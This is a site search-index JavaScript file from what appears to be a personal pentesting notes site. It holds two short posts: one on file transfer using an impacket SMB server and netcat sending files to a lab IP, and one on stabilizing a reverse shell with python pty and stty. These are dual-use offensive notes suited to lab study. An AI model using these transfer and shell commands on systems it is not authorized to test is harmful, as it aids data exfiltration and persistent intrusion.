var relearn_searchindex = [
  {
    "breadcrumb": "",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Dragonfly Commando",
    "uri": "/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Posts",
    "content": "SMB set up SMB server on kali\nimpacket-smbserver test . -smb2support -user user -password 1234\nConnect to the SMB from windows\nnet use Z: \\\\192.168.45.211\\test /user:user 1234\nnc linux file receiver\nnc -lp 1234 \u003e file.txt\nfile sender\nnc -q 0 192.168.45.211 1234 \u003c file.txt\nwindows file receiver\nnc -lp 1234 \u003e file.txt\nfile sender\nnc.exe -w 1 192.168.45.211 1234 \u003c file.txt",
    "description": "SMB set up SMB server on kali\nimpacket-smbserver test . -smb2support -user user -password 1234\nConnect to the SMB from windows\nnet use Z: \\\\192.168.45.211\\test /user:user 1234\nnc linux file receiver",
    "tags": [
      "Smbserver",
      "Nc"
    ],
    "title": "File Transfer",
    "uri": "/posts/file-transfer/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Nc",
    "uri": "/tags/nc/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Posts",
    "uri": "/posts/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Smbserver",
    "uri": "/tags/smbserver/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tags",
    "uri": "/tags/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Writeup",
    "uri": "/writeup/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Reverseshell",
    "uri": "/tags/reverseshell/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Posts",
    "content": "After getting a reverse shell, we can stabilize it using commands below.\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")' export TERM=xterm ctrl+z stty raw -echo; fg stty rows 38 columns 116",
    "description": "After getting a reverse shell, we can stabilize it using commands below.\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")' export TERM=xterm ctrl+z stty raw -echo; fg stty rows 38 columns 116",
    "tags": [
      "Reverseshell"
    ],
    "title": "Stabilize a reverse shell",
    "uri": "/posts/revshell-upgrade/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Categories",
    "uri": "/categories/index.html"
  }
]
